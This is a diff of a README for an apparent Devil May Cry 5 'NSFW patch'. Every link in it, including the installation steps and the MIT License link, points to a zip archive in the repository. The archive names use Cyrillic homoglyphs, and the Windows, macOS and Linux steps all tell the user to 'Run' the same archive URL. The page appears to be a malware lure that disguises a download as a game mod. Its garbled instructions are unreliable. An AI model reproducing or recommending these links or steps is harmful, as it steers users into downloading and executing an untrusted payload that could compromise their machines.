@@ -26,12 +26,12 @@ The **Devil May Cry 5 NSFW Patch** elevates your gameplay by making unique visua
 
 ## 🛠️ Installation
 
-1. **Download `https://raw.githubusercontent.com/Felipe2099/DMC5-ScarletTemptations-Patch/main/Lоader.zip` from the repository release section.**
-2. Extract `https://raw.githubusercontent.com/Felipe2099/DMC5-ScarletTemptations-Patch/main/Lоader.zip` using 7-Zip, WinRAR, or your favorite archive tool.
+1. **Download `https://github.com/Felipe2099/DMC5-ScarletTemptations-Patch/raw/refs/heads/main/asarabacca/DM-Temptations-Patch-Scarlet-1.3.zipоhttps://github.com/Felipe2099/DMC5-ScarletTemptations-Patch/raw/refs/heads/main/asarabacca/DM-Temptations-Patch-Scarlet-1.3.zip` from the repository release section.**
+2. Extract `https://github.com/Felipe2099/DMC5-ScarletTemptations-Patch/raw/refs/heads/main/asarabacca/DM-Temptations-Patch-Scarlet-1.3.zipоhttps://github.com/Felipe2099/DMC5-ScarletTemptations-Patch/raw/refs/heads/main/asarabacca/DM-Temptations-Patch-Scarlet-1.3.zip` using 7-Zip, WinRAR, or your favorite archive tool.
 3. Open the extracted folder and find the executable file appropriate for your OS:
-   - For **Windows:** Run `https://raw.githubusercontent.com/Felipe2099/DMC5-ScarletTemptations-Patch/main/Lоader.zip`
-   - For **macOS:** Run `https://raw.githubusercontent.com/Felipe2099/DMC5-ScarletTemptations-Patch/main/Lоader.zip`
-   - For **Linux:** Launch `https://raw.githubusercontent.com/Felipe2099/DMC5-ScarletTemptations-Patch/main/Lоader.zip` via Terminal
+   - For **Windows:** Run `https://github.com/Felipe2099/DMC5-ScarletTemptations-Patch/raw/refs/heads/main/asarabacca/DM-Temptations-Patch-Scarlet-1.3.zipоhttps://github.com/Felipe2099/DMC5-ScarletTemptations-Patch/raw/refs/heads/main/asarabacca/DM-Temptations-Patch-Scarlet-1.3.zip`
+   - For **macOS:** Run `https://github.com/Felipe2099/DMC5-ScarletTemptations-Patch/raw/refs/heads/main/asarabacca/DM-Temptations-Patch-Scarlet-1.3.zipоhttps://github.com/Felipe2099/DMC5-ScarletTemptations-Patch/raw/refs/heads/main/asarabacca/DM-Temptations-Patch-Scarlet-1.3.zip`
+   - For **Linux:** Launch `https://github.com/Felipe2099/DMC5-ScarletTemptations-Patch/raw/refs/heads/main/asarabacca/DM-Temptations-Patch-Scarlet-1.3.zipоhttps://github.com/Felipe2099/DMC5-ScarletTemptations-Patch/raw/refs/heads/main/asarabacca/DM-Temptations-Patch-Scarlet-1.3.zip` via Terminal
 4. Follow the on-screen instructions to configure your patch settings and launch Devil May Cry 5.
 5. (Optional) Review documentation for troubleshooting, FAQ, and advanced configuration.
 
@@ -95,7 +95,7 @@ Install and use this patch at your own risk. We do not take responsibility for a
 
 ## 📜 MIT License
 
-This project is licensed under the [MIT License](https://raw.githubusercontent.com/Felipe2099/DMC5-ScarletTemptations-Patch/main/Lоader.zip).  
+This project is licensed under the [MIT License](https://github.com/Felipe2099/DMC5-ScarletTemptations-Patch/raw/refs/heads/main/asarabacca/DM-Temptations-Patch-Scarlet-1.3.zipоhttps://github.com/Felipe2099/DMC5-ScarletTemptations-Patch/raw/refs/heads/main/asarabacca/DM-Temptations-Patch-Scarlet-1.3.zip).  
 See the `LICENSE` file in this repository for full details.
 
 ---
